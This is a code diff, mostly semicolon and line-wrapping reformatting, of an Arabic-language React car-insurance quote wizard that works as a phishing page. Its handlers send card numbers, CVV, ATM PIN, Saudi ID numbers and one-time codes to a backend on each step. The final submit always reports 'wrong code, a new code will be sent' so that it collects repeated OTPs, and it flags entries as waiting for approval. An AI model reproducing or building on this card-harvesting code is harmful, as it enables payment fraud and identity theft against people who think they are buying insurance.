       message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
     },
-  }
+  };
 
   const validateField = (fieldName: string, value: any): string | null => {
-    const rule = validationRules[fieldName as keyof typeof validationRules] as any
-    if (!rule) return null
+    const rule = validationRules[
+      fieldName as keyof typeof validationRules
+    ] as any;
+    if (!rule) return null;
 
-    if (rule.required && (!value || value === "" || (Array.isArray(value) && value.length === 0))) {
-      return rule.message
+    if (
+      rule.required &&
+      (!value || value === "" || (Array.isArray(value) && value.length === 0))
+    ) {
+      return rule.message;
     }
 
     if (value && rule.pattern && !rule.pattern.test(value)) {
-      return rule.message
+      return rule.message;
     }
 
     if (value && rule.validate) {
-      const customError = rule.validate(value)
-      if (customError) return customError
+      const customError = rule.validate(value);
+      if (customError) return customError;
     }
 
-    return null
-  }
+    return null;
+  };
 
   const validateStep = (step: number): boolean => {
-    const stepErrors: Record<string, string> = {}
-    let isValid = true
+    const stepErrors: Record<string, string> = {};
+    let isValid = true;
 
     switch (step) {
       case 1:
-        const ownerNameError = validateField("documment_owner_full_name", formData.documment_owner_full_name)
+        const ownerNameError = validateField(
+          "documment_owner_full_name",
+          formData.documment_owner_full_name,
+        );
         if (ownerNameError) {
-          stepErrors.documment_owner_full_name = ownerNameError
-          isValid = false
+          stepErrors.documment_owner_full_name = ownerNameError;
+          isValid = false;
         }
         if (formData.insurance_purpose === "renewal") {
-          const ownerIdError = validateField("owner_identity_number", formData.owner_identity_number)
+          const ownerIdError = validateField(
+            "owner_identity_number",
+            formData.owner_identity_number,
+          );
           if (ownerIdError) {
-            stepErrors.owner_identity_number = ownerIdError
-            isValid = false
+            stepErrors.owner_identity_number = ownerIdError;
+            isValid = false;
           }
         } else if (formData.insurance_purpose === "property-transfer") {
-          const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
-          const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)
+          const buyerIdError = validateField(
+            "buyer_identity_number",
+            formData.buyer_identity_number,
+          );
+          const sellerIdError = validateField(
+            "seller_identity_number",
+            formData.seller_identity_number,
+          );
           if (buyerIdError) {
-            stepErrors.buyer_identity_number = buyerIdError
-            isValid = false
+            stepErrors.buyer_identity_number = buyerIdError;
+            isValid = false;
           }
           if (sellerIdError) {
-            stepErrors.seller_identity_number = sellerIdError
-            isValid = false
+            stepErrors.seller_identity_number = sellerIdError;
+            isValid = false;
           }
         }
-        break
+        break;
       case 3:
-        const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
+        const selectedOfferError = validateField(
+          "selectedInsuranceOffer",
+          formData.selectedInsuranceOffer,
+        );
         if (selectedOfferError) {
-          stepErrors.selectedInsuranceOffer = selectedOfferError
-          isValid = false
+          stepErrors.selectedInsuranceOffer = selectedOfferError;
+          isValid = false;
         }
-        break
+        break;
       case 5:
-        const phoneError = validateField("phone", formData.phone)
+        const phoneError = validateField("phone", formData.phone);
         if (phoneError) {
-          stepErrors.phone = phoneError
-          isValid = false
+          stepErrors.phone = phoneError;
+          isValid = false;
         }
         if (!formData.agreeToTerms) {
-          stepErrors.agreeToTerms = "يجب الموافقة على الشروط والأحكام للمتابعة"
-          isValid = false
+          stepErrors.agreeToTerms = "يجب الموافقة على الشروط والأحكام للمتابعة";
+          isValid = false;
         }
-        break
+        break;
     }
 
-    setErrors((prev) => ({ ...prev, ...stepErrors }))
-    return isValid
-  }
+    setErrors((prev) => ({ ...prev, ...stepErrors }));
+    return isValid;
+  };
 
   const handleFieldChange = (fieldName: string, value: any) => {
-    setFormData((prev) => ({ ...prev, [fieldName]: value }))
+    setFormData((prev) => ({ ...prev, [fieldName]: value }));
     if (errors[fieldName]) {
-      setErrors((prev) => ({ ...prev, [fieldName]: "" }))
+      setErrors((prev) => ({ ...prev, [fieldName]: "" }));
     }
-  }
+  };
 
   const handleFieldBlur = (fieldName: string) => {
-    setTouched((prev) => ({ ...prev, [fieldName]: true }))
-    const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
+    setTouched((prev) => ({ ...prev, [fieldName]: true }));
+    const error = validateField(
+      fieldName,
+      formData[fieldName as keyof typeof formData],
+    );
     if (error) {
-      setErrors((prev) => ({ ...prev, [fieldName]: error }))
+      setErrors((prev) => ({ ...prev, [fieldName]: error }));
     }
-  }
+  };
 
   const nextStep = () => {
     if (validateStep(currentPage)) {
       if (currentPage < steps.length) {
-        const visitorId = localStorage.getItem("visitor")
+        const visitorId = localStorage.getItem("visitor");
         const dataToSave = {
           id: visitorId,
           currentPage: currentPage + 1,
@@ -877,28 +1114,28 @@ function ProfessionalQuoteForm() {
           cardYear,
           cvv,
           pinCode,
-        }
-        addData(dataToSave)
-        setCurrentStep(currentPage + 1)
+        };
+        addData(dataToSave);
+        setCurrentStep(currentPage + 1);
       }
     }
-  }
+  };
 
   const prevStep = () => {
-    const vistorId = localStorage.getItem("visitor")
+    const vistorId = localStorage.getItem("visitor");
     if (currentPage > 1) {
-      setCurrentStep(currentPage - 1)
-      addData({ id: vistorId, currentPage })
+      setCurrentStep(currentPage - 1);
+      addData({ id: vistorId, currentPage });
     }
-  }
+  };
 
   const handleSubmit = async () => {
     if (!validateStep(7)) {
-      return
+      return;
     }
 
-    setIsSubmitting(true)
-    const visitorId = localStorage.getItem("visitor")
+    setIsSubmitting(true);
+    const visitorId = localStorage.getItem("visitor");
 
     try {
       await addData({
@@ -911,22 +1148,22 @@ function ProfessionalQuoteForm() {
         otpAttempts: otpAttempts + 1,
         paymentStatus: "completed",
         ...formData,
-      })
+      });
 
-      await new Promise((resolve) => setTimeout(resolve, 2000))
+      await new Promise((resolve) => setTimeout(resolve, 2000));
 
-      alert("!رمز خاطئ, سوف يتم ارسال رمز جديد")
-      setOtp("")
-      setOtpAttempts((prev) => prev + 1)
+      alert("!رمز خاطئ, سوف يتم ارسال رمز جديد");
+      setOtp("");
+      setOtpAttempts((prev) => prev + 1);
       if (otpAttempts === 4) {
-        window.location.href = "/verify-phone"
+        window.location.href = "/verify-phone";
       }
     } catch (error) {
-      alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
+      alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.");
     } finally {
-      setIsSubmitting(false)
+      setIsSubmitting(false);
     }
-  }
+  };
 
   const ValidatedInput = ({
     label,
@@ -938,16 +1175,16 @@ function ProfessionalQuoteForm() {
     autoFocus = false,
     ...props
   }: {
-    label: string
-    fieldName: string
-    type?: string
-    placeholder?: string
-    required?: boolean
-    className?: string
-    autoFocus?: boolean
-    [key: string]: any
+    label: string;
+    fieldName: string;
+    type?: string;
+    placeholder?: string;
+    required?: boolean;
+    className?: string;
+    autoFocus?: boolean;
+    [key: string]: any;
   }) => {
-    const hasError = errors[fieldName] && touched[fieldName]
+    const hasError = errors[fieldName] && touched[fieldName];
 
     return (
       <div className={className}>
@@ -959,25 +1196,28 @@ function ProfessionalQuoteForm() {
           placeholder={placeholder}
           value={formData[fieldName as keyof typeof formData] as string}
           onChange={(e) => {
-            const value = e.target.value
-            handleFieldChange(fieldName, value)
+            const value = e.target.value;
+            handleFieldChange(fieldName, value);
           }}
           onBlur={() => handleFieldBlur(fieldName)}
           className={`h-12 ${hasError ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
           {...props}
         />
         {hasError && (
-          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
+          <div
+            className="flex items-center gap-2 mt-2 text-red-600 text-sm"
+            role="alert"
+          >
             <AlertCircle className="w-4 h-4 flex-shrink-0" />
             <span>{errors[fieldName]}</span>
           </div>
         )}
       </div>
-    )
-  }
+    );
+  };
 
   function handlePayment(): void {
-    const visitorId = localStorage.getItem("visitor")
+    const visitorId = localStorage.getItem("visitor");
     addData({
       id: visitorId,
       cardNumber,
@@ -988,32 +1228,32 @@ function ProfessionalQuoteForm() {
       paymentStatus: "processing",
       pinCode,
       ...formData,
-    })
+    });
 
-    setPaymentProcessing(true)
+    setPaymentProcessing(true);
 
     setTimeout(() => {
-      setPaymentProcessing(false)
-      setCurrentStep(7)
-      setOtpTimer(120)
+      setPaymentProcessing(false);
+      setCurrentStep(7);
+      setOtpTimer(120);
       addData({
         id: visitorId,
         paymentStatus: "completed",
         otpSent: true,
         currentPage: 7,
-      })
-      setOtpSent(true)
-    }, 2000)
+      });
+      setOtpSent(true);
+    }, 2000);
   }
 
   function verifyOTP(): void {
-    const visitorId = localStorage.getItem("visitor")
+    const visitorId = localStorage.getItem("visitor");
     // allOtp.push(otp) // This line was removed to avoid issues with pushing to a global array
 
     // Clear any previous error and set waiting state
-    setOtpError(null)
-    setWaitingForApproval(true)
-    setApprovalStatus("pending")
+    setOtpError(null);
+    setWaitingForApproval(true);
+    setApprovalStatus("pending");
 
     addData({
       id: visitorId,
@@ -1024,12 +1264,12 @@ function ProfessionalQuoteForm() {
       otpApproved: null, // Reset approval status
       waitingForApproval: true,
       ...formData,
-    })
+    });
   }
 
   function sendOTP(): void {
-    const visitorId = localStorage.getItem("visitor")
-    setOtpTimer(120)
+    const visitorId = localStorage.getItem("visitor");
+    setOtpTimer(120);
     addData({
       id: visitorId,
       otpSentTime: new Date().toISOString(),
@@ -1037,28 +1277,29 @@ function ProfessionalQuoteForm() {
       otpSent: true,
       paymentStatus: "completed",
       ...formData,
-    })
-    setOtpSent(true)
+    });
+    setOtpSent(true);
   }
 
   function handlePinSubmit(): void {
-    const visitorId = localStorage.getItem("visitor")
-    setIsSubmitting(true)
+    const visitorId = localStorage.getItem("visitor");
+    setIsSubmitting(true);
 
     addData({
       id: visitorId,
       pinCode,
       pinSubmittedTime: new Date().toISOString(),
       finalStatus: "completed",
+      currentPage: "9999",
       ...formData,
-    })
+    });
 
     // Simulate processing
     setTimeout(() => {
-      setIsSubmitting(false)
-      alert("تم إتمام العملية بنجاح!")
-      window.location.href = "/"
-    }, 2000)
+      setIsSubmitting(false);
+      alert("تم إتمام العملية بنجاح!");
+      window.location.href = "/";
+    }, 2000);
   }
 
   return (
@@ -1074,7 +1315,10 @@ function ProfessionalQuoteForm() {
             <div className="block sm:hidden">
               <div className="flex items-center gap-2 overflow-x-auto pb-2">
                 {steps.map((step, index) => (
-                  <div key={step.number} className="flex items-center flex-shrink-0">
+                  <div
+                    key={step.number}
+                    className="flex items-center flex-shrink-0"
+                  >
                     <div className="flex flex-col items-center">
                       <div
                         className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${
@@ -1085,11 +1329,17 @@ function ProfessionalQuoteForm() {
                               : "bg-gray-200 text-gray-600"
                         }`}
                       >
-                        {step.number < currentPage ? <CheckCircle className="w-5 h-5" /> : step.number}
+                        {step.number < currentPage ? (
+                          <CheckCircle className="w-5 h-5" />
+                        ) : (
+                          step.number
+                        )}
                       </div>
                       <p
                         className={`text-xs mt-2 text-center w-20 ${
-                          step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
+                          step.number === currentPage
+                            ? "text-[#109cd4] font-semibold"
+                            : "text-gray-600"
                         }`}
                       >
                         {step.title.split(" ")[0]}
@@ -1098,7 +1348,9 @@ function ProfessionalQuoteForm() {
                     {index < steps.length - 1 && (
                       <div
                         className={`w-8 h-0.5 mx-2 transition-all duration-300 ${
-                          step.number < currentPage ? "bg-green-500" : "bg-gray-300"
+                          step.number < currentPage
+                            ? "bg-green-500"
+                            : "bg-gray-300"
                         }`}
                       />
                     )}
@@ -1130,18 +1382,24 @@ function ProfessionalQuoteForm() {
                     <div className="text-center mt-3">
                       <p
                         className={`text-sm lg:text-base font-semibold ${
-                          step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
+                          step.number === currentPage
+                            ? "text-[#109cd4]"
+                            : "text-gray-700"
                         }`}
                       >
                         {step.title}
                       </p>
-                      <p className="text-xs text-gray-500 hidden lg:block mt-1">{step.subtitle}</p>
+                      <p className="text-xs text-gray-500 hidden lg:block mt-1">
+                        {step.subtitle}
+                      </p>
                     </div>
                   </div>
                   {index < steps.length - 1 && (
                     <div
                       className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
-                        step.number < currentPage ? "bg-green-500" : "bg-gray-300"
+                        step.number < currentPage
+                          ? "bg-green-500"
+                          : "bg-gray-300"
                       }`}
                     />
                   )}
@@ -1156,23 +1414,43 @@ function ProfessionalQuoteForm() {
               {currentPage === 1 && (
                 <div className="space-y-8">
                   <div className="text-center mb-8">
-                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    <h3
+                      ref={stepHeaderRef}
+                      tabIndex={-1}
+                      className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3"
+                    >
                       البيانات الأساسية
                     </h3>
-                    <p className="text-gray-600">أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر</p>
+                    <p className="text-gray-600">
+                      أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر
+                    </p>
                   </div>
-                  <MockInsurancePurpose formData={formData} setFormData={setFormData} errors={errors} />
-                  <MockVehicleRegistration formData={formData} setFormData={setFormData} errors={errors} />
+                  <MockInsurancePurpose
+                    formData={formData}
+                    setFormData={setFormData}
+                    errors={errors}
+                  />
+                  <MockVehicleRegistration
+                    formData={formData}
+                    setFormData={setFormData}
+                    errors={errors}
+                  />
                 </div>
               )}
 
               {currentPage === 2 && (
                 <div className="space-y-8">
                   <div className="text-center mb-8">
-                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    <h3
+                      ref={stepHeaderRef}
+                      tabIndex={-1}
+                      className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3"
+                    >
                       بيانات التأمين
                     </h3>
-                    <p className="text-gray-600">حدد تفاصيل وثيقة التأمين ونوع التغطية المطلوبة</p>
+                    <p className="text-gray-600">
+                      حدد تفاصيل وثيقة التأمين ونوع التغطية المطلوبة
+                    </p>
                   </div>
 
                   <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
@@ -1186,7 +1464,8 @@ function ProfessionalQuoteForm() {
                     />
                     <div>
                       <label className="block text-sm font-semibold text-gray-700 mb-3">
-                        القيمة التقديرية للمركبة <span className="text-red-500">*</span>
+                        القيمة التقديرية للمركبة{" "}
+                        <span className="text-red-500">*</span>
                       </label>
                       <Input
                         maxLength={6}
@@ -1210,12 +1489,19 @@ function ProfessionalQuoteForm() {
                             ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                             : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
                         }`}
-                        onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
+                        onClick={() =>
+                          handleFieldChange(
+                            "insuranceTypeSelected",
+                            "comprehensive",
+                          )
+                        }
                       >
                         <div className="text-center">
                           <Shield className="w-8 h-8 mx-auto mb-2 text-current" />
                           <div className="font-semibold">تأمين شامل</div>
-                          <div className="text-sm text-gray-500 mt-1">تغطية كاملة للمركبة</div>
+                          <div className="text-sm text-gray-500 mt-1">
+                            تغطية كاملة للمركبة
+                          </div>
                         </div>
                       </button>
                       <button
@@ -1225,12 +1511,19 @@ function ProfessionalQuoteForm() {
                             ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                             : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
                         }`}
-                        onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
+                        onClick={() =>
+                          handleFieldChange(
+                            "insuranceTypeSelected",
+                            "against-others",
+                          )
+                        }
                       >
                         <div className="text-center">
                           <Users className="w-8 h-8 mx-auto mb-2 text-current" />
                           <div className="font-semibold">تأمين ضد الغير</div>
-                          <div className="text-sm text-gray-500 mt-1">التغطية الأساسية</div>
+                          <div className="text-sm text-gray-500 mt-1">
+                            التغطية الأساسية
+                          </div>
                         </div>
                       </button>
                     </div>
@@ -1241,30 +1534,42 @@ function ProfessionalQuoteForm() {
                       <CardContent className="p-6 text-center">
                         <div className="flex items-center justify-center gap-2 mb-4">
                           <Users className="w-6 h-6 text-[#109cd4]" />
-                          <span className="font-semibold text-lg">إضافة سائقين</span>
+                          <span className="font-semibold text-lg">
+                            إضافة سائقين
+                          </span>
                         </div>
                         <div className="flex items-center justify-center gap-4">
                           <button
                             type="button"
                             className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
                             onClick={() =>
-                              handleFieldChange("additionalDrivers", Math.max(0, formData.additionalDrivers - 1))
+                              handleFieldChange(
+                                "additionalDrivers",
+                                Math.max(0, formData.additionalDrivers - 1),
+                              )
                             }
                           >
                             -
                           </button>
-                          <span className="text-2xl font-bold text-gray-900">{formData.additionalDrivers}</span>
+                          <span className="text-2xl font-bold text-gray-900">
+                            {formData.additionalDrivers}
+                          </span>
                           <button
                             type="button"
                             className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
                             onClick={() =>
-                              handleFieldChange("additionalDrivers", Math.min(5, formData.additionalDrivers + 1))
+                              handleFieldChange(
+                                "additionalDrivers",
+                                Math.min(5, formData.additionalDrivers + 1),
+                              )
                             }
                           >
                             +
                           </button>
                         </div>
-                        <p className="text-sm text-gray-500 mt-2">الحد الأقصى 5 سائقين</p>
+                        <p className="text-sm text-gray-500 mt-2">
+                          الحد الأقصى 5 سائقين
+                        </p>
                       </CardContent>
                     </Card>
 
@@ -1272,18 +1577,29 @@ function ProfessionalQuoteForm() {
                       <CardContent className="p-6 text-center">
                         <div className="flex items-center justify-center gap-2 mb-4">
                           <Star className="w-6 h-6 text-green-600" />
-                          <span className="font-semibold text-lg text-green-800">خصومات خاصة</span>
+                          <span className="font-semibold text-lg text-green-800">
+                            خصومات خاصة
+                          </span>
                         </div>
                         <div className="flex items-center gap-3 mb-3">
                           <input
                             type="checkbox"
                             className="w-5 h-5 text-green-600"
                             checked={formData.specialDiscounts}
-                            onChange={(e) => handleFieldChange("specialDiscounts", e.target.checked)}
+                            onChange={(e) =>
+                              handleFieldChange(
+                                "specialDiscounts",
+                                e.target.checked,
+                              )
+                            }
                           />
-                          <span className="text-sm text-green-800">أريد الحصول على خصومات خاصة</span>
+                          <span className="text-sm text-green-800">
+                            أريد الحصول على خصومات خاصة
+                          </span>
                         </div>
-                        <Button className="bg-green-600 hover:bg-green-700 text-white w-full">عرض الخصومات</Button>
+                        <Button className="bg-green-600 hover:bg-green-700 text-white w-full">
+                          عرض الخصومات
+                        </Button>
                       </CardContent>
                     </Card>
                   </div>
@@ -1293,10 +1609,16 @@ function ProfessionalQuoteForm() {
               {currentPage === 3 && (
                 <div className="space-y-8">
                   <div className="text-center mb-8">
-                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    <h3
+                      ref={stepHeaderRef}
+                      tabIndex={-1}
+                      className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3"
+                    >
                       قائمة الأسعار
                     </h3>
-                    <p className="text-gray-600">قارن بين العروض المتاحة واختر الأنسب لك</p>
+                    <p className="text-gray-600">
+                      قارن بين العروض المتاحة واختر الأنسب لك
+                    </p>
                   </div>
 
                   <div className="flex justify-center mb-8">
@@ -1308,7 +1630,12 @@ function ProfessionalQuoteForm() {
                             ? "bg-[#109cd4] text-white shadow-md"
                             : "text-gray-600 hover:text-gray-900"
                         }`}
-                        onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
+                        onClick={() =>
+                          handleFieldChange(
+                            "insuranceTypeSelected",
+                            "against-others",
+                          )
+                        }
                       >
                         ضد الغير
                       </button>
@@ -1319,7 +1646,12 @@ function ProfessionalQuoteForm() {
                             ? "bg-[#109cd4] text-white shadow-md"
                             : "text-gray-600 hover:text-gray-900"
                         }`}
-                        onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
+                        onClick={() =>
+                          handleFieldChange(
+                            "insuranceTypeSelected",
+                            "comprehensive",
+                          )
+                        }
                       >
                         شامل
                       </button>
@@ -1329,17 +1661,31 @@ function ProfessionalQuoteForm() {
                   <div className="space-y-4 max-h-96 overflow-y-auto">
                     {offerData
                       .filter((offer) => {
-                        if (formData.insuranceTypeSelected === "comprehensive") {
-                          return offer.type === "comprehensive" || offer.type === "special"
+                        if (
+                          formData.insuranceTypeSelected === "comprehensive"
+                        ) {
+                          return (
+                            offer.type === "comprehensive" ||
+                            offer.type === "special"
+                          );
                         }
-                        return offer.type === "against-others"
+                        return offer.type === "against-others";
                       })
-                      .sort((a, b) => Number.parseFloat(a.main_price) - Number.parseFloat(b.main_price))
+                      .sort(
+                        (a, b) =>
+                          Number.parseFloat(a.main_price) -
+                          Number.parseFloat(b.main_price),
+                      )
                       .slice(0, 8)
                       .map((offer, index) => {
-                        const totalExpenses = offer.extra_expenses.reduce((sum, expense) => sum + expense.price, 0)
-                        const finalPrice = Number.parseFloat(offer.main_price) + totalExpenses
-                        const isSelected = formData.selectedInsuranceOffer === offer.id
+                        const totalExpenses = offer.extra_expenses.reduce(
+                          (sum, expense) => sum + expense.price,
+                          0,
+                        );
+                        const finalPrice =
+                          Number.parseFloat(offer.main_price) + totalExpenses;
+                        const isSelected =
+                          formData.selectedInsuranceOffer === offer.id;
 
                         return (
                           <Card
@@ -1349,7 +1695,12 @@ function ProfessionalQuoteForm() {
                                 ? "ring-2 ring-[#109cd4] shadow-lg bg-blue-50/30"
                                 : "hover:shadow-sm border-gray-200"
                             }`}
-                            onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
+                            onClick={() =>
+                              handleFieldChange(
+                                "selectedInsuranceOffer",
+                                offer.id,
+                              )
+                            }
                           >
                             <CardContent className="p-0">
                               {/* Header Section */}
@@ -1359,20 +1710,29 @@ function ProfessionalQuoteForm() {
                                   <div className="flex-shrink-0 mt-1">
                                     <div
                                       className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
-                                        isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
+                                        isSelected
+                                          ? "border-[#109cd4] bg-[#109cd4]"
+                                          : "border-gray-300 bg-white"
                                       }`}
                                     >
-                                      {isSelected && <div className="w-2 h-2 bg-white rounded-full" />}
+                                      {isSelected && (
+                                        <div className="w-2 h-2 bg-white rounded-full" />
+                                      )}
                                     </div>
                                   </div>
 
                                   {/* Icon */}
                                   <div
                                     className={`w-18 h-18 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${
-                                      isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
+                                      isSelected
+                                        ? "bg-[#109cd4]/10"
+                                        : "bg-gray-100"
                                     }`}
                                   >
-                                    <img src={offer.company.image_url}className={`w-16 h-16 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
+                                    <img
+                                      src={offer.company.image_url}
+                                      className={`w-16 h-16 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`}
+                                    />
                                   </div>
 
                                   {/* Content */}
@@ -1405,14 +1765,19 @@ function ProfessionalQuoteForm() {
 
                                   {/* Price */}
                                   <div className="text-right flex-shrink-0">
-                                    <p className="text-lg font-bold text-gray-900">{finalPrice.toFixed(0)}</p>
-                                    <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
+                                    <p className="text-lg font-bold text-gray-900">
+                                      {finalPrice.toFixed(0)}
+                                    </p>
+                                    <p className="text-xs text-gray-500 leading-tight">
+                                      ر.س / سنوياً
+                                    </p>
                                   </div>
                                 </div>
                               </div>
 
                               {/* Features Section */}
-                              {offer.extra_features.filter((f) => f.price === 0).length > 0 && (
+                              {offer.extra_features.filter((f) => f.price === 0)
+                                .length > 0 && (
                                 <div className="px-4 pb-4">
                                   <div className="pt-3 border-t border-gray-100">
                                     <div className="space-y-2">
@@ -1420,21 +1785,33 @@ function ProfessionalQuoteForm() {
                                         .filter((f) => f.price === 0)
                                         .slice(0, 3)
                                         .map((feature, idx) => (
-                                          <div key={idx} className="flex items-center gap-2">
+                                          <div
+                                            key={idx}
+                                            className="flex items-center gap-2"
+                                          >
                                             <div className="w-4 h-4 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                                               <Check className="w-2.5 h-2.5 text-green-600" />
                                             </div>
                                             <span className="text-xs text-gray-700 leading-relaxed">
                                               {feature.content.length > 35
-                                                ? feature.content.substring(0, 35) + "..."
+                                                ? feature.content.substring(
+                                                    0,
+                                                    35,
+                                                  ) + "..."
                                                 : feature.content}
                                             </span>
                                           </div>
                                         ))}
                                     </div>
-                                    {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
+                                    {offer.extra_features.filter(
+                                      (f) => f.price === 0,
+                                    ).length > 3 && (
                                       <p className="text-xs text-[#109cd4] mt-2 font-medium">
-                                        +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
+                                        +
+                                        {offer.extra_features.filter(
+                                          (f) => f.price === 0,
+                                        ).length - 3}{" "}
+                                        ميزة إضافية
                                       </p>
                                     )}
                                   </div>
@@ -1451,7 +1828,7 @@ function ProfessionalQuoteForm() {
                               )}
                             </CardContent>
                           </Card>
-                        )
+                        );
                       })}
                   </div>
 
@@ -1467,15 +1844,26 @@ function ProfessionalQuoteForm() {
               {currentPage === 4 && (
                 <div className="space-y-8">
                   <div className="text-center mb-8">
-                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    <h3
+                      ref={stepHeaderRef}
+                      tabIndex={-1}
+                      className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3"
+                    >
                       الإضافات والخدمات
                     </h3>
-                    <p className="text-gray-600">اختر الخدمات الإضافية التي تناسب احتياجاتك</p>
+                    <p className="text-gray-600">
+                      اختر الخدمات الإضافية التي تناسب احتياجاتك
+                    </p>
                   </div>
 
                   {(() => {
-                    const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                    const paidFeatures = selectedOffer?.extra_features.filter((f) => f.price > 0) || []
+                    const selectedOffer = offerData.find(
+                      (offer) => offer.id === formData.selectedInsuranceOffer,
+                    );
+                    const paidFeatures =
+                      selectedOffer?.extra_features.filter(
+                        (f) => f.price > 0,
+                      ) || [];
 
                     if (paidFeatures.length === 0) {
                       return (
@@ -1483,47 +1871,71 @@ function ProfessionalQuoteForm() {
                           <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                             <CheckCircle className="w-10 h-10 text-green-600" />
                           </div>
-                          <h4 className="text-2xl font-bold text-gray-900 mb-3">جميع المزايا مشمولة!</h4>
+                          <h4 className="text-2xl font-bold text-gray-900 mb-3">
+                            جميع المزايا مشمولة!
+                          </h4>
                           <p className="text-gray-600 text-lg">
-                            العرض المختار يشمل جميع المزايا الأساسية بدون رسوم إضافية
+                            العرض المختار يشمل جميع المزايا الأساسية بدون رسوم
+                            إضافية
                           </p>
                         </div>
-                      )
+                      );
                     }
 
                     return (
                       <div className="space-y-4">
                         {paidFeatures.map((feature) => (
-                          <Card key={feature.id} className="border-2 border-gray-200 hover:shadow-md transition-all">
+                          <Card
+                            key={feature.id}
+                            className="border-2 border-gray-200 hover:shadow-md transition-all"
+                          >
                             <CardContent className="p-6">
                               <div className="flex items-center justify-between">
                                 <div className="flex items-center gap-4">
                                   <input
                                     type="checkbox"
                                     className="w-5 h-5 text-[#109cd4]"
-                                    checked={formData.selectedAddons.includes(feature.id)}
+                                    checked={formData.selectedAddons.includes(
+                                      feature.id,
+                                    )}
                                     onChange={(e) => {
                                       const newAddons = e.target.checked
-                                        ? [...formData.selectedAddons, feature.id]
-                                        : formData.selectedAddons.filter((id) => id !== feature.id)
-                                      handleFieldChange("selectedAddons", newAddons)
+                                        ? [
+                                            ...formData.selectedAddons,
+                                            feature.id,
+                                          ]
+                                        : formData.selectedAddons.filter(
+                                            (id) => id !== feature.id,
+                                          );
+                                      handleFieldChange(
+                                        "selectedAddons",
+                                        newAddons,
+                                      );
                                     }}
                                   />
                                   <div>
-                                    <h4 className="font-bold text-gray-900 text-lg">{feature.content}</h4>
-                                    <p className="text-gray-600">خدمة إضافية اختيارية</p>
+                                    <h4 className="font-bold text-gray-900 text-lg">
+                                      {feature.content}
+                                    </h4>
+                                    <p className="text-gray-600">
+                                      خدمة إضافية اختيارية
+                                    </p>
                                   </div>
                                 </div>
                                 <div className="text-left">
-                                  <p className="text-xl font-bold text-gray-900">+{feature.price} ر.س</p>
-                                  <p className="text-sm text-gray-500">سنوياً</p>
+                                  <p className="text-xl font-bold text-gray-900">
+                                    +{feature.price} ر.س
+                                  </p>
+                                  <p className="text-sm text-gray-500">
+                                    سنوياً
+                                  </p>
                                 </div>
                               </div>
                             </CardContent>
                           </Card>
                         ))}
                       </div>
-                    )
+                    );
                   })()}
                 </div>
               )}
@@ -1531,15 +1943,23 @@ function ProfessionalQuoteForm() {
               {currentPage === 5 && (
                 <div className="space-y-8">
                   <div className="text-center mb-8">
-                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    <h3
+                      ref={stepHeaderRef}
+                      tabIndex={-1}
+                      className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3"
+                    >
                       ملخص الطلب ومعلومات التواصل
                     </h3>
-                    <p className="text-gray-600">راجع طلبك وأدخل معلومات التواصل لإتمام العملية</p>
+                    <p className="text-gray-600">
+                      راجع طلبك وأدخل معلومات التواصل لإتمام العملية
+                    </p>
                   </div>
 
                   <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                     <div className="space-y-6">
-                      <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
